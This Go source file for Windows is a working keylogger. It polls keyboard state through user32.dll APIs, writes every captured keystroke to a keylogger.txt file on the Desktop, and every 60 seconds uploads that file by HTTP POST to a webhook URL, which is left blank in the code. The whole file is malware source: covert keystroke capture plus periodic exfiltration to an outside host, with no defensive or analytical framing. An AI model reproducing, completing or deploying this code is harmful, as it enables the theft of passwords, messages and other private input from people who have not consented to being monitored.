package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	getKeyboardState = user32.NewProc("GetKeyboardState")
	mapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	toUnicode        = user32.NewProc("ToUnicode")
)

const (
	mapVK       = 2
	webhookURL  = ""
	uploadDelay = 60 * time.Second // Upload log file every 60 seconds
)

func GetAsyncKeyState(vKey int) bool {
	ret, _, _ := getAsyncKeyState.Call(uintptr(vKey))
	return ret == 0x8001 || ret == 0x8000
}

func GetKeyboardState(lpKeyState *[256]byte) bool {
	ret, _, _ := getKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return ret != 0
}

func MapVirtualKey(uCode uint, uMapType uint) uint {
	ret, _, _ := mapVirtualKey.Call(uintptr(uCode), uintptr(uMapType))
	return uint(ret)
}

func ToUnicode(wVirtKey uint, wScanCode uint, lpKeyState *[256]byte, pwszBuff *uint16, cchBuff int, wFlags uint) int {
	ret, _, _ := toUnicode.Call(
		uintptr(wVirtKey),
		uintptr(wScanCode),
		uintptr(unsafe.Pointer(lpKeyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		uintptr(cchBuff),
		uintptr(wFlags),
	)
	return int(ret)
}

func getDesktopPath() (string, error) {
	desktopPath, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("unable to find user home directory: %w", err)
	}
	return filepath.Join(desktopPath, "Desktop", "keylogger.txt"), nil
}

func openLogFile(path string) (*os.File, error) {
	file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return nil, fmt.Errorf("failed to open or create log file: %w", err)
	}
	return file, nil
}

func logKeyPresses(file *os.File) {
	var keyState [256]byte
	var buffer [2]uint16

	for {
		for ascii := 9; ascii <= 254; ascii++ {
			if GetAsyncKeyState(ascii) {
				if !GetKeyboardState(&keyState) {
					continue
				}

				virtualKey := MapVirtualKey(uint(ascii), mapVK)
				ret := ToUnicode(uint(ascii), uint(virtualKey), &keyState, &buffer[0], len(buffer), 0)

				if ret > 0 {
					runes := utf16.Decode(buffer[:ret])
					text := string(runes)
					_, err := file.WriteString(text)
					if err != nil {
						fmt.Println("Error writing to file:", err)
						return
					}
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func uploadFile(url, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	err = writer.Close()
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		return fmt.Errorf("failed to upload file: %s", resp.Status)
	}

	return nil
}

func main() {
	desktopPath, err := getDesktopPath()
	if err != nil {
		fmt.Println("Error getting desktop path:", err)
		return
	}

	file, err := openLogFile(desktopPath)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	defer file.Close()

	// Start keylogging in a separate goroutine
	go logKeyPresses(file)

	// Periodically upload the log file
	for {
		time.Sleep(uploadDelay)
		err := uploadFile(webhookURL, desktopPath)
		if err != nil {
			fmt.Println("Error uploading file:", err)
		} else {
			fmt.Println("File uploaded successfully!")
		}
	}
}
